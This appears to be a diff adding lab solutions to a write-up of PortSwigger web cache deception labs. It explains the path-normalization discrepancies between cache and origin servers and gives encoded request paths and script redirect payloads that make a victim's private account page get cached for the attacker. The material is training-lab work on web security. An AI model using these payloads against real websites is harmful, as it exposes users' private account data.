@@ -2230,3 +2230,46 @@ Entice victim to visit web site with following content:
     <script>document.location="https://0af6002f0433c9a78018260300a9006d.web-security-academy.net/my-account;cba.css"</script>
 
 This will cache victim's private profile info. Then visit this URL to get the solution.
+
+### Lab: Exploiting origin server normalization for web cache deception
+
+    https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-origin-server-normalization
+
+Detecting: find directory that is cached: `/resources/`
+
+Cache server does not resolve dot-segments or decode slashes. Origin server decodes slash characters and resolves dot-segments. Therefore request: `/resources/..%2fmy-account` will be cached with the content of `/my-account` response (because origin server will normalize this request to `/my-account`.
+
+Entice victim to visit web site with following content:
+
+    <script>document.location="https://0a2900ad04226daa82e59d3000ec0072.web-security-academy.net/resources/..%2fmy-account"</script>
+
+### Lab: Exploiting cache server normalization for web cache deception
+
+    https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-cache-server-normalization
+
+Detecting: find directory that is cached: `/resources/`
+
+Detecting discrepancies in how the cache and origin server interpret characters as delimiters:
+
+Cache server gives identical responses for following two requests:
+
+```
+GET /aaaaaaaa/..%2fresources/labheader/js/labHeader.js
+GET /resources/labheader/js/labHeader.js
+```
+
+Origin server DOES NOT give identical responses for following requests:
+
+```
+GET /my-account
+GET /aaaaaaaaaa/..%2fmy-account
+```
+
+We detected discrepancy: cache server resolves encoded `/` character (`%2f`) and origin server does not resolve it.
+
+Detecting delimeter character that works on origin server but does not work on cache server (for payload list use delimeters from: `https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list`:
+
+
+Solution:
+
+    <script>document.location="https://0a34005104e4105e806b1c9c00190063.web-security-academy.net/my-account%23%2f%2e%2e%2fresources"</script>
